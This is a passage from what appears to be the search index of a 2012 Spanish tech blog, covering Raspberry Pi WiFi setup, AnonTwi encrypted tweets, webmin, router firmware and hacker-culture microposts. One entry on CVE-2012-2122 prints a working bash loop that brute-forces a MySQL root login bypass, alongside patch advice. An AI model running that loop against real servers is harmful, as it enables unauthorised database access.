192.168.1.0 Reiniciamos el servicio para que los cambios tengan efecto: bash pi@raspberry:~$ sudo service networking restart Si queremos arrancar el entorno gráfico LXDE: bash pi@raspberrypi:~$ startx Conexión inalámbrica con una antena WIFI USB En mi caso, tengo antena WiFi USB con chip ZyDAS que se necesita configurar. Conectamos la antena y comprobamos que la reconoce: bash pi@raspberrypi:~$ lsusb Bus 001 Device 004: ID 0ace:1211 ZyDAS ZD1211 802.11g El controlador para esta antena no es libre, así que para instalarlo deberemos activar los repositorios non-free . Editamos el fichero /etc/apt/sources.list y la añadimos, para que quede: bash deb http://ftp.uk.debian.org/debian/ squeeze main non-free Actualizamos los repositorios: bash pi@raspberrypi:~$ sudo aptitude update Instalamos el controlador: bash pi@raspberrypi:~$ sudo aptitude install zd1211-firmware Si el siguiente comando nos funciona, sólo quedará configurar la conexión: bash pi@raspberrypi:~$ sudo iwlist wlan0 scan Conexión WPA2 Si queremos configurar la conexión inalámbrica a una red cifrada con WPA2, lo primero será asegurarnos de que tenemos el paquete necesario: bash pi@raspberrypi:~$ sudo aptitude install wpasupplicant Creamos el fichero con el nombre de la red y la contraseña: bash pi@raspberrypi:~$ wpa_passphrase MYESSID mypassphrase | sudo tee /etc/wpa_supplicant/wpa_supplicant.conf pi@raspberrypi:~$ sudo chmod 600 /etc/wpa_supplicant/wpa_supplicant.conf Editamos el fichero para añadirle los siguientes campos: bash network { ssid=\"MYSSID\" #psk=\"mypassphrase\" psk=ce4d0c6d7585a8432e2205c2b8d2ec5439dab5d9185f4b6f4c41d4120eb36161 proto=RSN # \"RSN\" para WPA2, \"WPA\" para WPA key_mgmt=WPA-PSK pairwise=CCMP TKIP # CCMP==AES group=CCMP TKIP } Editamos el fichero de configuración de la red, /etc/network/interfaces , y le asignamos una IP estática, por ejemplo: bash auto wlan0 iface wlan0 inet static address 192.168.1.51 gateway 192.168.1.1 broadcast 192.168.1.255 network 192.168.1.0 wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf Sólo queda reiniciar la red: bash pi@raspberrypi:~$ sudo service networking restart Aunque todo parecía ir bien, al final no logro que establecer la conexión. Mirando en los logs he podido encontrar: bash pi@raspberrypi:~$ dmesg | grep zd1211rw zd1211rw 1-1.2:1.0: phy0 usbcore: registered new interface driver zd1211rw zd1211rw 1-1.2:1.0: firmware version 4605 zd1211rw 1-1.2:1.0: zd1211 chip 0ace:1211 v4330 high 00-02-e3 RF2959_RF pa0 g---- zd1211rw 1-1.2:1.0: TX-stall detected, reseting device... Parece ser que ese TX-stall detected es debido a que la Raspberry Pi no aporta suficiente potencia para la antena WIFI , por lo que la única solución parece que es utilizar una hub USB con alimentación. Proyectos relacionados Algunos proyectos que ya están en marcha, relacionados con Raspberry Pi: expEYES : una herramienta, sofware y hardware, para desarrollo y experimentación de proyectos científicos [10] módulo con cámara : un prototipo de cámara que puede ser conectada a Raspberry Pi [11] Raspberry Pi y Arduino : algunos ejemplos [12][13][14] de comunicación entre ambos dispositivos [15] Pwnpi : distribución enfocada a tests de penetración [16] raspbmc : distribución enfocada a utilizar la Raspberry Pi como Media Center [17] Otros enlaces interesantes: » Carcasas » Placas de expansión » Periféricos de bajo nivel » Especificaciones de hardware Referencias http://www.raspberrypi.org/faqs http://www.raspberrypi.org/about http://www.raspberrypi.org/archives/260 http://www.sakoman.com/OMAP/microsd-card-perfomance-test-results.html http://www.raspberrypi.org/phpBB3/viewtopic.php?f=2&t=4076 http://elinux.org/RPi_VerifiedPeripherals http://www.raspberrypi.org/downloads http://github.com/raspberrypi http://elinux.org/RPi_Easy_SD_Card_Setup http://www.raspberrypi.org/archives/1228 http://www.raspberrypi.org/archives/1254 http://www.doctormonk.com/2012/04/raspberry-pi-and-arduino.html http://www.doctormonk.com/2012/05/gpio-led-blink-from-python-using-slice.html http://omer.me/2012/05/introducing-ponte/ http://www.raspberrypi.org/archives/1171 http://www.pwnpi.com/ http://www.raspbmc.com/about/","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/06/21/raspberry-pi/","loc":"https://karpoke.ignaciocano.com/2012/06/21/raspberry-pi/"},{"title":"The Conscience of a Hacker","text":"Another one got caught today, it's all over the papers. \"Teenager Arrested in Computer Crime Scandal\", \"Hacker Arrested after Bank Tampering\"... Damn kids. They're all alike. But did you, in your three-piece psychology and 1950's technobrain, ever take a look behind the eyes of the hacker? Did you ever wonder what made him tick, what forces shaped him, what may have molded him? I am a hacker, enter my world... Mine is a world that begins with school... I'm smarter than most of the other kids, this crap they teach us bores me... Damn underachiever. They're all alike. » phrack.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/21/the-conscience-of-a-hacker/","loc":"https://karpoke.ignaciocano.com/2012/06/21/the-conscience-of-a-hacker/"},{"title":"Hackstory","text":"La Hackstory es una enciclopedia online que versa sobre la cultura e historia hacker, con especial atención a las iniciativas, grupos, anécdotas y puntos de encuentro hispanos. La estamos creando desde finales del verano de 2008, en nuestro tiempo libre, y ya llevamos entrados unos 200 artículos. Tenemos 18.000 visitas mensuales, 580 al día. En nuestro proyecto, la palabra \"hacker\" no es sinónimo de delincuente, sino de persona experta y entusiasta con la tecnología, de alguien muy habilidoso con las herramientas que brindan la informática y las telecomunicaciones. Si quieres saber más, puedes consultar nuestra definición en hackstory.net/index.php/Hacker Nos gusta especialmente cómo describía a los hackers la genial hacktivista St Jude: \"Los hackers son los cuerpos de élite de los diseñadores y programadores informáticos. Les gusta verse a sí mismos como los magos y guerreros de la tecnología. Los hackers tienen su propia cultura, con su propio lenguaje. En su tiempo libre, pueden cambiar su ingenuidad por el combate contra enemigos en las Redes, o el paseo a medianoche por sistemas en los que tú no podrías entrar a menos que fueses tan inteligente como ellos. Los hackers del lado oscuro, llamados crackers, se meten en sistemas para robar y destruir, pero la mayoría de hackers están en esto por virtuosismo\". » goteo.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/21/hackstory/","loc":"https://karpoke.ignaciocano.com/2012/06/21/hackstory/"},{"title":"The 8 Queens Problem with Arduino and Adafruit 8x8 Matrix display","text":"Using an Arduino and an 8x8 matrix display from Adafruit (with I2C backpack), we display all the solutions to the classic 8-Queens problem (see http://en.wikipedia.org/wiki/Eight_queens_puzzle ) A solution to the 8 Queen problem is where 8 queens are placed on a chess board so that no queen can take any other queen. @stormingrobots | youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/21/the-8-queens-problem-with-arduino-and-adafruit-8x8-matrix-display/","loc":"https://karpoke.ignaciocano.com/2012/06/21/the-8-queens-problem-with-arduino-and-adafruit-8x8-matrix-display/"},{"title":"LEGO Turing Machine","text":"This is a short documentary about the LEGO Turing Machine built by Jeroen van den Bos and Davy Landman at Centrum Wiskunde & Informatica (CWI), Amsterdam (Netherlands). They built it for CWI's exposition \"Turings Erfenis\" in honor of the centenary of Alan Turing's birth on 23 June 1912. Alan Turing was a brilliant mathematician who helped define the theoretical model of the computer as we know it today. He was a visionary, one of the few people of his time who recognized the role the computer would play for humanity. The Turing Machine (1936) is an adequate model of a computer. It can do anything the computers of today or tomorrow can do. @ecalpemos | vimeo.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/21/lego-turing-machine/","loc":"https://karpoke.ignaciocano.com/2012/06/21/lego-turing-machine/"},{"title":"Code vs. power consumption","text":"I've been wondering for some time whether the power consumption of an ATmega varies depending on the code it is running. Obviously, sleep modes and clock rate changes have a major impact – but how about plain loops? » jeelabs.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/16/code-vs-power-consumption/","loc":"https://karpoke.ignaciocano.com/2012/06/16/code-vs-power-consumption/"},{"title":"Linux: The 0.01 Release","text":"\"This is a free minix-like kernel for i386(+) based AT-machines,\" began the Linux version 0.01 release notes in September of 1991 for the first release of the Linux kernel. \"As the version number (0.01) suggests this is not a mature product. Currently only a subset of AT-hardware is supported (hard-disk, screen, keyboard and serial lines), and some of the system calls are not yet fully implemented (notably mount/umount aren't even implemented).\" Booting the original 0.01 Linux kernel required bootstrapping it with minix, and the keyboard driver was written in assembly and hard-wired for a Finnish keyboard. The listed features were mostly presented as a comparison to minix and included, efficiently using the 386 chip rather than the older 8088, use of system calls rather than message passing, a fully multithreaded FS, minimal task switching, and visible interrupts. Linus Torvalds noted, \"the guiding line when implementing linux was: get it working fast. I wanted the kernel simple, yet powerful enough to run most unix software.\" » kerneltrap.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/16/linux-the-0-01-release/","loc":"https://karpoke.ignaciocano.com/2012/06/16/linux-the-0-01-release/"},{"title":"El Top 7 de dilemas que enfrentan los desarrolladores de hoy","text":"Tu jefe lo quiere para ayer, pero más vale que cumpla con los standards de mañana. Los clientes quieren todas las características que se puedan imaginar, pero no te atrevas a confundirlos dándoles todos los botones que desee. Tus compañeros programadores quieren que documentes tu código, pero ellos simplemente responden \"tl;dr\" (Too Long; didn't read) a cualquier cosa que escribes. Así como la tecnología evoluciona, también lo hacen los dilemas que enfrentan los desarrolladores. Cada elección, desde la plataforma hasta el almacenamiento de datos, incluyendo a cuánto control darle a los usuarios, está cargada de preguntas. Y gracias a la nube, el crecimiento de la tecnología móvil y la acelerada vanguardia, pareciera como si el mundo de la programación enfrentara una nueva elección – y dilema – a un ritmo creciente. » elbauldelprogramador.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/16/el-top-7-de-dilemas-que-enfrentan-los-desarrolladores-de-hoy/","loc":"https://karpoke.ignaciocano.com/2012/06/16/el-top-7-de-dilemas-que-enfrentan-los-desarrolladores-de-hoy/"},{"title":"AnonTwi, tweets cifrados","text":"AnonTwi es un script en Python que permite enviar y recibir tweets y mensajes cifrados mediante AES y HMAC-SHA1 en Twitter, al que se conecta mediante SSL. Otras caracterísiticas son la posibilidad de usar la red TOR, envío de mensajes largos o la falsificación de las cabeceras que envía. Instalación AnonTwi está todavía en fase beta de desarrollo, algo que se debe tener en cuenta según el uso que queramos darle, pero si queremos probarlo, podemos usar la última versión descargándola del repositorio: ```bash $ hg clone http://hg.code.sf.net/p/anontwi/code anontwi-code ``` Instalamos las dependencias: ```bash $ sudo aptitude install python-crypto python-httplib2 ``` OAuth Para utilizar OAuth con Twitter, vamos a dev.twitter.com , iniciamos sesión y creamos una App: __Name:** El que queramos, pero debe ser único. Description: AnonTwi: AES + HMAC-SHA1 encryption on Tweets and Direct Messages Website: http://anontwi.sf.net Una vez creada, copiamos las claves Consumer key y Consumer secret que utilizaremos más tarde. En la pestaña de configuración, cambiamos los permisos de la aplicación para que pueda leer, escribir y enviar mensajes directos. Vamos al directorio donde nos hemos descargado AnonTwi y editamos el fichero config.py para incluir dichas claves. Tokens Además de las claves que hemos creado, necesitaremos dos tokens de acceso, no debemos crearlos desde el panel de administración de la aplicación que hemos creado, sino con el propio script : ```bash $ ./anontwi --tokens ``` Seguimos el enlace, que nos llevará hasta la página que nos pide que autoricemos la aplicación, y tras autorizarla nos devolverá el PIN que deberemos pasarle al script . A continuación se crean los tokens de acceso. AnonTwi no guarda estos valores, así que para evitar tener que estar continuamente pasándoselos al script podemos exportar las siguientes variables: ```bash $ export ANONTWI_TOKEN_KEY=6684922-Foa6b1KShUIWviFHjFfZrASyYKV8fPe9teXZwWllIE $ export ANONTWI_TOKEN_SECRET=izXb9vG8xWKAgH2GvYzl8EqeJDalSGg2MkrheoasoI ``` Si las copiamos al final del fichero ~/.bashrc no tendremos que volver a preocuparnos. Ejemplos La sintáxis para utilizar el script es la siguiente: ```bash $ ./anontwi [-m 'text' | -r 'ID' | -d @user | -f @nick | -u @nick] [OPTIONS] 'token key' 'token secret' ``` Para enviar un mensaje cifrado a un usuario, tenemos que compartir una clave, que el usuario utilizará para descifrarlo. Podemos utilizar el script para crear una clave segura y aleatoria: ```bash $ ./anontwi --gen PIN key: P/2/QwWyVp48ta8+T4oasd/G6wNWELt9/MjUZlWs53M= ``` Ahora ya podemos enviar un mensaje directo cifrado: ```bash $ ./anontwi -m \"See you later\" -d \"@nick\" --enc --pin \"P/2/QwWyVp48ta8+T4oasd/G6wNWELt9/MjUZlWs53M=\" =========================================================================== AnonTwi [0.4] - 2012 - http://anontwi.sf.net -> by psy =========================================================================== Starting to send your DM (direct message)... :) =========================================================================== Message [ Number of words: 3 - Number of waves: 1 ] \"See you later\" To: \"@nick\" [Info] DM sended correctly! ``` Para enviar un tweet cifrado: bash $ ./anontwi -m \"Hello World\" --enc --pin \"mystrongpassword\" Para descifrar un tweet podemos hacerlo incluyendo directamente el contenido del tweet : bash $ ./anontwi --dec \"7asNGpFFDKQl7ku9om9CQfEKDq1ablUW+srgaFiEMa+YK0no8pXsx8pR\" --pin \"friend's key\" O introduciendo la URL del tweet : bash $ ./anontwi --dec \"http://twitter.com/encrypted_message_path\" --pin \"friend's key\" Se pueden ver muchos más ejemplos de uso en el archivo README.txt . Interfaz gráfica Hay disponible un módulo, Simple Decript Tool, que permite utilizar una herramienta gráfica en lugar del terminal para descifrar los mensajes. Si queremos probarla, antes instalaremos las dependencias: bash $ sudo aptitude install gambas2 Descargamos el paquete, lo descomprimimos y lo instalamos: bash $ wget http://freesoftwareando.com/gambas-anontwi_all.deb.tar.gz $ tar xzvf gambas-anontwi_all.deb.tar.gz $ sudo dpkg -i gambas-anontwi_0.0.10-1_all.deb Al instalarlo, me ha surgido el siguiente error: bash En el fichero ;`/usr/share/menu/gambas-anontwi;', en (o en la defición que termina en) la línea 4: ?package(gambas-anontwi):needs=\"X11\" section \"Applications/Network/Communication\" title=\"AnonTwi Simple Decrypt Tool\" command=\"/usr/bin/gambas-anontwi.gambas\" icon=\"/usr/share/pixmaps/gambas-anontwi.png\" &#94; Esperaba: ;`=;' Parece ser debido a una pequeña errata en el fichero /usr/share/menu/gambas-anontwi . Si queremos corregirlo, descomprimimos el fichero gambas-anontwi_0.0.10-1_all.deb : bash $ mkdir temp $ dpkg-deb --extract gambas-anontwi_0.0.10-1_all.deb temp $ dpkg-deb --control gambas-anontwi_0.0.10-1_all.deb temp/DEBIAN Modificamos el fichero temp/usr/share/menu/gambas-anontwi para incluir el = que falta, de tal manera que quede así: bash ?package(gambas-anontwi):needs=\"X11\" section=\"Applications/Network/Communication\" title=\"AnonTwi Simple Decrypt Tool\" command=\"/usr/bin/gambas-anontwi.gambas\" icon=\"/usr/share/pixmaps/gambas-anontwi.png\" Volvemos a crear el paquete: bash $ dpkg --build temp $ mv temp.deb gambas-anontwi_0.0.10-1_all.deb Y lo instalamos: bash $ sudo dpkg -i gambas-anontwi_0.0.10-1_all.deb Para lanzar la aplicación podemos hacerlo desde el menú, o lanzando el siguiente comando en el terminal bash $ anontwi.gambas Referencias » anontwi.sourceforge.net » AnonTwi: cliente de Twitter que permite cifrar tweets y mensajeria privada » Como cambiar las dependencias de un paquete (.deb)","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/06/16/anontwi-tweets-cifrados/","loc":"https://karpoke.ignaciocano.com/2012/06/16/anontwi-tweets-cifrados/"},{"title":"Sócrates y el efecto Dunning-Kruger","text":"El efecto Dunning-Kruger se puede expresar de la siguiente manera: los peores trabajadores/estudiantes/participantes son los que menos conscientes son de su propia incompetencia. Toma su nombre de un estudio de 2003 que realizaron Dunning, Kruger y otros con estudiantes universitarios con respecto a los resultados de sus exámenes. Después los resultados han sido reproducidos en varias ocasiones, por ejemplo con estudiantes de medicina a la hora de evaluar su capacidad para realizar entrevistas de diagnóstico, con administrativos evaluando su rendimiento o con técnicos de laboratorios médicos calibrando su nivel de dominio del trabajo. » experientiadocet.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/14/socrates-y-el-efecto-dunning-kruger/","loc":"https://karpoke.ignaciocano.com/2012/06/14/socrates-y-el-efecto-dunning-kruger/"},{"title":"pbzip2, un bzip2 más rápido","text":"pbzip2 , de parallel bzip2 , permite aprovechar toda la potencia de los procesadores con más de un núcleo a la hora de comprimir o descomprimir, cosa que bzip2 no hace. Instalación En Ubuntu se encuentra disponible en los repositorios: bash $ sudo aptitude install pbzip2 Su uso es idéntico al de bzip2 , por lo que podemos añadir un alias a ~/.bash_aliases : bash alias bzip2=pbzip2 Referencias » Speed Up Compression via Parallel BZIP2 (PBZIP2)","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/06/13/pbzip2-un-bzip2-mas-rapido/","loc":"https://karpoke.ignaciocano.com/2012/06/13/pbzip2-un-bzip2-mas-rapido/"},{"title":"La falacia del Programador Perdido","text":"La semana pasada desayuné con un polémico artículo de Enrique Dans titulado \"El Programador Perdido\", en el que lamentaba la falta de buenos programadores en España. Programadores con cabeza y riñones suficientes para sacar adelante un proyecto ganador en una industria global y competitiva como Internet. Si quieres encontrar un buen programador, básicamente sólo tienes que hacer una cosa: pagarlo. Pero esa presunción –como las comparaciones con la supuesta calificación y estatus de los programadores extranjeros- es errónea y estereotipada. Después de más de 10 años trabajando en la industria del software, tanto en España como en eso que llaman Silicon Valley, yo conozco otra verdad. Una verdad incómoda. » bonillaware.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/12/la-falacia-del-programador-perdido/","loc":"https://karpoke.ignaciocano.com/2012/06/12/la-falacia-del-programador-perdido/"},{"title":"webmin, configurando nuestro servidor a través del navegador","text":"Webmin es una interfaz web para la administración de un servidor, compatible con cualquier navegador moderno, mediante la que podemos configurar cuentas de usuario, Apache, DNS, intercambio de ficheros, etc. Es una alternativa a la configuración manual de ficheros. Instalación Instalamos las dependencias: bash $ sudo aptitude install perl libnet-ssleay-perl openssl libauthen-pam-perl libpam-runtime libio-pty-perl apt-show-versions Descargamos el paquete para Ubuntu y lo instalamos: bash $ wget http://downloads.sourceforge.net/webadmin/webmin_1.580_all.deb $ md5sum webmin_1.580_all.deb 093c720a988125a536fa9fda16080fe6 $ sudo dpkg -i webmin_1.580_all.deb Para usar Webmin, accedemos al servidor en el puerto 10000. El usuario y la contraseña son los mismos que utilizamos para iniciar sesión en el servidor. Si fuese el caso, activamos la regla en el cortafuegos. Por ejemplo, si usamos ufw y queremos permitir el acceso únicamente desde la misma red: bash $ sudo ufw allow proto tcp from 192.168.50.0/24 to any port 10000","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/06/12/webmin-configurando-nuestro-servidor-a-traves-del-navegador/","loc":"https://karpoke.ignaciocano.com/2012/06/12/webmin-configurando-nuestro-servidor-a-traves-del-navegador/"},{"title":"CVE 2012-2122, saltándose la autenticación para acceder a MySQL y MariaDB","text":"Un fallo descubierto en MariaDB, y que también afecta a MySQL, permite saltarse la autenticación para acceder a la base de datos utilizando cualquier usuario válido, incluido el root, sin importar la contraseña. Cada vez que un usuario se conecta se genera un token SHA aleatorio y se compara con el valor esperado, pero bajo ciertas condiciones el resultado de esta comparación se considera válido aunque realmente no lo sea. Dado que el protocolo utiliza cadenas aleatorias, hay una probabilidad de 1/256 de que esto ocurra. No todas las versiones son vulnerables: Todas las versiones de MariaDB y MySQL hasta la 5.1.61, 5.2.11, 5.3.5 y 5.5.22 son vulnerables. Las versiones de MariaDB desde la 5.1.62, 5.2.12, 5.3.6 y 5.5.23 no lo son. Las versiones de MySQL desde la 5.1.63, 5.5.24 y 5.6.6 no lo son. Explotación y medidas de protección Explotar un sistema vulnerable es tan sencillo como intentar conectarnos de forma repetida: bash $ for i in {1..512}; do echo 'select @@version;' | mysql -uroot -ppass -h 127.0.0.1 2>/dev/null && break; done Ya hay disponibles actualizaciones en los repositorios para las versiones afectadas. Actualizado el 13 de junio de 2012 En hispasec amplían la noticia y explican muy detalladamente las condiciones en las que se produce el falso positivo en la comprobación de la contraseña. También he cambiado la prueba de concepto por la de HD Moore porque me parece más elegante :) Más información » CVE-2012-2122 » Security vulnerability in MySQL/MariaDB sql/password.c » MySQL o cómo es posible dar por válida una contraseña incorrecta","tags":"hack","url":"https://karpoke.ignaciocano.com/2012/06/12/cve-2012-2122-saltandose-la-autenticacion-para-acceder-a-mysql-y-mariadb/","loc":"https://karpoke.ignaciocano.com/2012/06/12/cve-2012-2122-saltandose-la-autenticacion-para-acceder-a-mysql-y-mariadb/"},{"title":"CDE, creando aplicaciones portables en GNU/Linux","text":"CDE es un programa desarrollado por Philip Guo que permite crear versiones portables de aplicaciones GNU/Linux, automatizando el proceso de empaquetado de código, datos y dependencias requeridos para ejecutarlas en otros equipos, sin que su uso requiera instalación ni configuración. Instalación Si queremos instalar la última versión en desarrollo: bash $ git clone git://github.com/pgbovine/CDE.git $ cd CDE $ make Una vez que termine de compilar, tendremos el programa ejecutable, cde . Creando aplicaciones portables Si queremos crear un versión portable, sólo tenemos que llamar al ejecutable que hemos creado pasándole como parámetro el nombre del programa. Por ejemplo, para crear una versión portable de gimp : bash $ ~/CDE/cde gimp Esto creará el directorio cde-package , que será el que podamos copiar a otro equipo, y que contiene la versión portable de gimp : gimp.cde . Podemos crear un repositorio con las aplicaciones que prefiramos, simplemente ejecutando cde desde el mismo directorio. bash $ mkdir portable $ cd portable $ ~/CDE/cde gimp $ ~/CDE/cde lowriter $ ~/CDE/cde firefox Referencias » pgbovine.net » Via linuxzone.es","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/06/11/cde-creando-aplicaciones-portables-en-gnulinux/","loc":"https://karpoke.ignaciocano.com/2012/06/11/cde-creando-aplicaciones-portables-en-gnulinux/"},{"title":"Client-Side vs. Server-Side Rendering","text":"Yesterday Twitter announced that it was moving away from client-side rendering back to server-side rendering in order to improve page load time. Today I found myself having to defend my position that server-side rendering will almost always be faster. I figured I'd blog about it. I want to point out a couple things. First, I'm talking specifically about render performance and page speed. There might be other compelling advantages to thick-clients; I'm talking about performance. Secondly, I'm going to get on a high horse here and say that it worries me that developers think client-side rendering is faster. This is basic and fundamental knowledge about how the web and browsers work. Maybe I'll be proven wrong. If I am, I'll admit it. It'll be embarrassing because it means that I don't know the fundamentals. But I'll be glad to have learned (which is why I blog). » openmymind.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/04/client-side-vs-server-side-rendering/","loc":"https://karpoke.ignaciocano.com/2012/06/04/client-side-vs-server-side-rendering/"},{"title":"OAuth - Open Authorization Protocol","text":"Cuando en 2006 los ingenieros de twitter estaban tratando de implementar OpenID para permitir a los desarrolladores de aplicaciones acceder a su API sin que los usuarios tuvieran que introducir sus credenciales en la propia aplicación, se dieron cuenta, por un lado, de que OpenID no era la solución que necesitaban y, más importante aún, de que no existía ningún estándar que permitiera hacer algo parecido. Comenzaron entonces a trabajar en la implementación de OAuth, que pronto fue apoyada por otras empresas como Google. Hasta que por fin, en octubre de 2007, se publicó OAuth 1.0. Aunque no fue hasta agosto de 2010 que no se aprobó como estándar RFC 5849. Pero, ¿cómo funciona OAuth y cómo soluciona el problema de que el usuario tenga que introducir sus credenciales en una aplicación de un tercero para acceder a otro servicio? » s21sec.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/04/oauth-open-authorization-protocol/","loc":"https://karpoke.ignaciocano.com/2012/06/04/oauth-open-authorization-protocol/"},{"title":"Deuda técnica","text":"¿Qué desarrollador de software nunca ha estado una semana programando a toda velocidad, casi sin saber que hace, ya que la fecha de entrega está cerca y todo tiene que estar terminado \"para ayer\"? ¿Quién no se ha encontrado en la situación de saber que está programando una chapuza, pensando que otro día lo mejorará, y ese día nunca llega? ¿Quién alguna vez, al ver una porción de código fuente no ha exclamado indignado: ¡qué narices hace este código! o ¡quién leches lo ha programado!? A todo este código lo solemos calificar como chapuzas, apaños, ñapas, mierdecillas¦ Su problema es que, por lo general, se va extendiendo de forma exponencial y acumulándose a lo largo del desarrollo de un proyecto. Y en consecuencia tenemos como resultado un código fuente que es muy difícil de mantener, extender y reutilizar; y un aplicativo que funcionalmente tiene problemas. » programandonet.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/04/deuda-tecnica/","loc":"https://karpoke.ignaciocano.com/2012/06/04/deuda-tecnica/"},{"title":"Cambiar el firmware del router Comtrend AR-5381u por uno libre","text":"Si tenemos un router Comtrend AR-5381u, uno de los que entrega Jazztel, podemos actualizar el firmware que trae por uno libre no oficial . ¿Por qué actualizar el firmware? Porque nos permite configurar completamente el router , sin restricciones. En particular, podremos cambiar el usuario de acceso al router o deshabilitar TS-069 (administración remota por parte de Jazztel y que es imposible deshabilitar con el firmware oficial) si queremos. Instalación Lo primero es escoger uno de los firmware disponibles. En mi caso, he probado el firmware 657003-457(AR-5382u-A731-406CTL-C01_R07).bin . Se puede descargar desde bandaancha.eu . Actualizaremos el firmware desde la propia administración del router , pero antes deberíamos tener claros los parámetros para configurar nuestra conexión. Más adelante pondré los que yo he utilizado, pero pueden ser diferentes en otros casos. Lo más sencillo es hacer capturas de pantalla de cada opción del panel de administración, así estaremos seguros de que no nos dejamos nada. Reseteamos el router , nos conectamos por cable y entramos al panel de administración. Después de haber reseteado el router , la IP por defecto será http://192.168.1.1 , el usuario admin y la contraseña admin . Nos conectamos al panel de administración, actualizaremos con el firmware que nos hemos descargado, en mi caso 657003-457(AR-5382u-A731-406CTL-C01_R07).bin , y le damos a actualizar. Después de que termine, volvemos a resetear el router . Para que quede claro porque es importante, antes de actualizar reseteamos el router , actualizamos y volvemos a resetear . Ahora ya podremos acceder al nuevo panel de administración en http://192.168.1.1 . El usuario por defecto es root y la contraseña 12345 . Esta es la que yo he utilizado pero dependiendo del firmware puede que la contraseña haya que dejarla en blanco, o incluso que usuario y contraseña sean user/user . Configuración Esta es la configuración que he usado para una conexión 20 MB con Jazztel. Lo primero es cambiar la contraseña de acceso. Vamos a Management > Access control: old username: root old password: 12345 Y ponemos el nuevo. También es interesante restringir el acceso al panel de administración del router . Vamos a Management > Service address y dejamos marcados: HTTP desde LAN SSH desde LAN Resto deshabilitado, si no lo vamos a usar. Ahora configuraremos la interfaz ATM. Vamos a Advanced setup > Layer2 interface > ATM interface > Add: VPI: 8 VCI: 35 DSL Latency: Path0 Link Type: EoA Connection Mode: Default Mode Encapsulation Mode: LLC/SNAP-BRIDGING Service Category: UBR without PCR IP QoS Scheduler: Strict Policy Le damos a guardar. Ahora la interfaz WAN. Vamos a Advanced setup > WAN interface > Add, seleccionamos atm(0_8_35) > PPPoE y marcamos: Enable NAT Enable firewall El resto de opciones de la interfaz las podemos dejar en blanco o por defecto. Añadiremos los servidores DNS. Vamos a Advanced setup > WAN service > Router ppp0 > DNS servers: OpenDNS: 208.67.222.222 y 208.67.220.220 Google:8.8.8.8 y 8.8.4.4 Jazztel: 87.216.1.65 y 87.216.1.66 Ya está, con esto el router ya debería sincronizar y deberíamos poder navegar. El resto de opciones de configuración dependerán de las necesidades de cada uno. Más opciones Servidores virtuales Si queremos añadir entradas en la NAT vamos a Advanced setup > NAT > Virtual servers. Si queremos redireccionar el puerto 80, nos avisará de que la interfaz web de acceso al router se cambia al puerto 8080. Sin embargo esto no sucede, y si tenemos un dominio para acceder a nuestra red desde Internet, y accedemos a dicho dominio desde dentro de la red, accederemos al panel de administración del router y no al equipo al que habíamos redirigido el puerto. Una solución es añadir el dominio en el archivo /etc/hosts . Por ejemplo, si nuestro dominio es domain.tld y el servidor web tiene la ip 192.168.50.100, en /etc/hosts añadiremos: bash domain.tld 192.168.50.100 Red inalámbrica Para configurar la red, vamos a Wireless > Basic: Nos aseguramos de que WPS está desactivado, si no lo vamos a usar. No hace mucho se ha descubierto una vulnerabilidad que permite acceso a la Wifi por fuerza bruta . Authentication: WPA-PSK, AES Si ponemos las mismas credenciales que teníamos anteriormente, es posible que nuestro equipo detecte la red y se conecte también a la red inalámbrica (además de que seguimos conectados por cable). Actualización horaria Si queremos que la hora del router se actualice consultando los servidores NTP de internet, vamos a Management > Internet time, y lo activamos. Referencias » Nuevos firms no oficiales ( y libres, por fin :D) para el AR-5381u con soporte 3G y DLNA (Act. 4 de septiembre) » Nuevos firmwares (no oficiales) para el AR-5381u","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/06/04/cambiar-el-firmware-del-router-comtrend-ar-5381u-por-uno-libre/","loc":"https://karpoke.ignaciocano.com/2012/06/04/cambiar-el-firmware-del-router-comtrend-ar-5381u-por-uno-libre/"},{"title":"Porque robar a los pequeños es más fácil","text":"Porque, en el mejor de los casos, seguimos pensando que ver la \"s\" de https:// y un candado cerrado en nuestro navegador web nos asegura que la página que visitamos es legítima. Porque pensamos que si tecleamos el nombre del dominio en la barra de direcciones no es posible que estemos visitando una página fraudulenta. Porque nos conocemos al dedillo la aplicación de banca electrónica de nuestra entidad financiera. Porque si esta página nos solicita más caracteres de lo habitual a la hora de introducir la contraseña no sospechamos. Porque si tras autenticarnos en la misma nos solicita todas las posiciones de la tarjeta de coordenadas, en muchos casos las seguimos introduciendo. @Mikel Gastesi | segu-info.com.ar","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/04/porque-robar-a-los-pequenos-es-mas-facil/","loc":"https://karpoke.ignaciocano.com/2012/06/04/porque-robar-a-los-pequenos-es-mas-facil/"},{"title":"How to Have Fun Programming","text":"I may not be a great programmer, but I have a ton of fun programming. As a self-taught hacker, I've always enjoyed programming to a great extent--but everyone has their ups and downs. These are simply my reflections about what makes me happy while programming, and serves as reminder to myself why I should keep pushing onwards! » rdegges.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/03/how-to-have-fun-programming/","loc":"https://karpoke.ignaciocano.com/2012/06/03/how-to-have-fun-programming/"},{"title":"Symfony en Ubuntu Lucid Lynx 10.04","text":"Symfony es una framework MVC escrito en PHP para el desarrollo rápido de páginas web. Además, ofrece un conjunto de buenas prácticas para desarrollar páginas más seguras y con un coste de mantenimiento menor. Para que la instalación sea más segura, los ficheros de Symfony debería estar fuera del DocumentRoot . Requisitos Symfony se basa en entorno LAMPP, por lo que suponemos que ya tenemos configurado Apache, MySQL y PHP versión 5.2.4 o superior. Para 